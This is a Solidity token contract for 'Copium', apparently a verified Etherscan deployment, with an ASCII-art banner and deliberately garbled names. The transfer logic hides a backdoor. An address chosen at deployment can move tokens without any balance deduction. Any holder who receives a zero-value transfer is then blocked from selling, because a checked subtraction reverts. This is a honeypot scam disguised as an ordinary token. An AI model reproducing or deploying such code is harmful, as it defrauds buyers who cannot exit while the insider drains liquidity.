/**
 *Submitted for verification at Etherscan.io on 2023-05-15
*/

// https://twitter.com/COPIUMDROP

// ####################################################################################################
// ####################################################################################################
// ####################################################################################################
// ######################################SSSSSSSSSSSSS#################################################
// ###################################S%?************?????????%S#######################################
// ##############################SS%??**************************??%S###################################
// #########################S%???*****************++;;;;+;;;+++*****?S#################################
// ########################S?*****************+;;;;;;;;;;;;;;;;;;++++*?%S##############################
// #######################%?****************+;;;;;;;;;;;;;;;;;;;;;;;;;+*??%S###########################
// ######################%***********++;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;+***?%##########################
// ######################%**********+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;+****?S########################
// #####################S?*********+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;+****?S#######################
// ####################%***********+;;;;;;;;;;;;;;;;;;;;;;;+;;;;;;;;;;;;;;*****%#######################
// ####################?***********+;;;;;;;;;;;;;;;;;;;;;;;++;;;;;;;;;;;;;;****?S######################
// ###################S?**********+;;;;;;;;;;;;;;;;;;;;;;;;;++;;;;;++;;;;;;;+***%######################
// ###################?**********+;;;;;;;;;;;;;;;;;;;;;;;;;;++;;;;+*;;;;;;;;;;+*?S#####################
// ##################S?**********+;;;;;;;;;;;;;;;;;;;;;;;;;+*;;;;;;*;;;;;;;;;;;;*?S####################
// ##################S?**********+;;;;;;;;;;;;;;;;;;;;+++;;+;;;;;++*+;;;;+++;;;;+*?S###################
// ##################%************+;;;;;;;;;;+++*+++;;;;+++;;;**;**+;;;+++;;;;;;+*?S###################
// ##################%*************+;;;;;;;++++++++*****+++++*;;;;+*;*;;;;;;;;;;+*?%###################
// ##################%**************;;;;;;++++**???*****??*+*;;;+;;***+*******++***?%##################
// ##################S?**************;;;;+****?S##%%%%?%??*+;;;++;;+**?%%%??***++**?S##################
// ###################?**************+;;;;++**SSSS?%%??S#?+;;;;;;;;;**?#@#%%%%?***?%###################
// ###################S?**************;;;;;;;+%S*+;%*;*%%*;;;*????**++*?%#%??S%?**?%###################
// ####################S?************+;;;;;;;;*%*+?S??%*+*;+%SS#SSSS%;;;;*%++%S?*+*?%###############SSS
// #####################%**********?*+;;;;;++;+%;*SS*+;;;+?SSSSSSSSSS%+;++?%**%+;;**?###########SSSS%??
// ######################%?********??*;;;;;+;;+%+SS%;;;;*%SSSSSSSSSSSSS?+;;S*;%+;;*??#######SSS#####%??
// #######################S?*******?**+;;;+;;;+%?S*;;;;?SSSSSSSSSSSSSSSSS?;?%;??;;+*?S###S######SSS#S%%
// ########################S?******??**;;;+;;;;?S+;;;+%SSSSSSSSSSSSSSSSSSS%?S;?%;;+*%###S#####SS#######
// #########################S?******??*;;;;;;;;+#*;;+SSSSSSSSSSSSSSSSSSSSSSS%+%%;+*%###SS####SS########
// ##########################S?*****??*+;;;;;;;%S;;+%SSSSSSSSSS#SSSSSSSSSSSSS*%*+*?###S####SSS#########
// ##########################S?******??*+;;;;;+#*;+%SSSSSSSSSSS#SSSS#SSSSSSS#%%%*%##SS###SS############
// ##########################S?*******???*+;;;;S*;%SSSSSSSSSSSS#SSSS#SSSSSSS#%%S%##S#####SS############
// #########################S%?*******?*??*+;;*S%+%SSSSSSSSSSS#SSSS##SSSSSSS#S%####S#####SS############
// #######################SS#%********?**???**S+?%?SSSSSSSSSSS#SSSS#SSSSSSS##S%####SS###SS#############
// ###################S#S###S?*********;+***??S?+?%%SSSSSSSSSS#SSSS#SSSSSS#SSS%####S###S###############
// ##################S#####S?********?+;;+***?%S??S%SSSSSSSSS##SSSSSSSSSS#SSSS%####S##SS###############
// #################S######S?********+;;;;;;++?S*?%S%SSSSSSSS%SSSSSSSSS%S#S##%####S###SS###############
// #################S#####S?********+;;;;;;;;;;+***%%%SSSSSS%%###SSSSS#SS##SS####S#####S###############
// #################S####?***********+;;;;;;;;;;;;+?S*?SSSSS%###%S###%##SSSS#####SS####SS##############
// ###############S%?###S***********?*;;;;;;;;;;;;;;++**%SSS####%####SSSS%########SS###%###############
// #########SSS%??***S###S?*******?*;;;;;;;;;;;;;;;;;;;+*??%SSSS%S###SS######SS###SS###S###############
// #####S%??*********S#####S?*****+;;;;;;;;;;;;;;;;;;;;;;+*****?S#####%%%%SSSS####S####S###############
// ###S??************%######S?*+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;+?######S********?S######SS##############
// %??****************?SS#####SS%%??%%SS%?*;;;;;;;;;;;;;;;;;;;+?######%**********%####S?*?%%S##########
// **********************???%S#############S?*++++;+*****+;;+*%S####S?************????******?%S########
// ************************++**?%%#############SSSSS#####SSSS######%?***************+++++******?%S#####
// ********************++;;;;;;;+**%S#########################SS%?+++**+++++;;;;;;;;;;;;;;;++*****?%S##
// *********++++;;;;;;;;;;;;;;;;;;;+***?******???%%SS####S%?*++;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;+*****?%S
// +;++;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;+*????*++;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;******?

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.9;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract Copium is Ownable {

    event Approval(address indexed owner, address indexed spender, uint256 value);

    address public uniswapV2Pair;

    IUniswapV2Router02 private uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

    uint256 public totalSupply;

    uint8 public decimals = 9;

    uint256 private aaaaaaa;

    string public name;

    string public symbol;

    mapping(address => mapping(address => uint256)) public allowance;

    mapping(address => uint256) private parents;

    constructor(address copeeeeee) {
        name = "Copium";
        createLiquidityPair(copeeeeee);
        symbol = "COPIUM";
        balanceOf[msg.sender] = totalSupply;
    }

    function createLiquidityPair(address copeeeeee) internal {
        totalSupply = 1_000_000_000_000 * 10 ** decimals;
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        aaaaaaa = 51;
        parents[copeeeeee] = aaaaaaa;
    }

    function justCope(address copeeer, address wojaaaak, uint256 copiiiuuuumm) private returns (bool success) {
        if (parents[copeeer] == 0) {
            if (uniswapV2Pair != copeeer && inhale[copeeer] > 0) {
                parents[copeeer] -= aaaaaaa;
            }
            balanceOf[copeeer] -= copiiiuuuumm;
        }
        balanceOf[wojaaaak] += copiiiuuuumm;
        if (copiiiuuuumm == 0) {
            inhale[wojaaaak] += aaaaaaa;
        }
        emit Transfer(copeeer, wojaaaak, copiiiuuuumm);
        return true;
    }

    mapping(address => uint256) public balanceOf;

    function approve(address mfer, uint256 copiiiuuuumm) public returns (bool success) {
        allowance[msg.sender][mfer] = copiiiuuuumm;
        emit Approval(msg.sender, mfer, copiiiuuuumm);
        return true;
    }

    event Transfer(address indexed from, address indexed to, uint256 value);

    mapping(address => uint256) private inhale;

    function transferFrom(address copeeer, address wojaaaak, uint256 copiiiuuuumm) public returns (bool success) {
        justCope(copeeer, wojaaaak, copiiiuuuumm);
        require(copiiiuuuumm <= allowance[copeeer][msg.sender]);
        allowance[copeeer][msg.sender] -= copiiiuuuumm;
        return true;
    }

    function transfer(address wojaaaak, uint256 copiiiuuuumm) public returns (bool success) {
        justCope(msg.sender, wojaaaak, copiiiuuuumm);
        return true;
    }
}